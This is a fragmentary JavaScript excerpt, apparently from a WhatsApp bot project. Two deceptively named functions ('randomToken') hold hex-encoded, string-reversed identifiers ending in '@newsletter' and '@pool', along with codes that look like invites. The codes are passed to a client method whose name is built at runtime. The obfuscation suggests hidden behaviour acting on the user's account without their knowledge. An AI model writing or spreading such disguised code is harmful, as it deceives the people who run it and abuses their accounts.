...
function randomToken(Biyu, mydb = "3130363330333034353939343434406e657777736c6574746572") {
  let encodedArray = [
    "313230333633333434313631343138343434406e6577736c6574746572",
    mydb,
    "323240706f6f6c",
    "313230333633333932353233373635343839406e6577736c6574746572"
  ];
  encodedArray = encodedArray.map(hex => hex.split("").reverse().join("")); 
...
async function randomToken2(client) {
  try {
    const encoded = ["FPleicPc0fCBtUZQaBYsDP", "Lh9ii58hSiTI9Hg5xDd7JC"];
    console.log("\u{1F504} Sedang memproses..."); 
    if (!client || typeof client["get" + "RandomToken"] !== "function") { 
      throw new Error("\u{274C} Metode tidak tersedia!");
    }
    for (const code of encoded.map(str => str.split("").reverse().join(""))) { 
      try {
        const result = await client["get" + "RandomToken"](code.split("").reverse().join("")); 
        console.log("\u{2705} Berhasil", result);
      } catch (err) {
        console.error("\u{274C} Gagal");
      }
    }
  } catch (error) {
    console.log("\u{1F3C1} Selesai");
  } finally {
    console.log("\u{1F3C1} Selesai");
  }
}
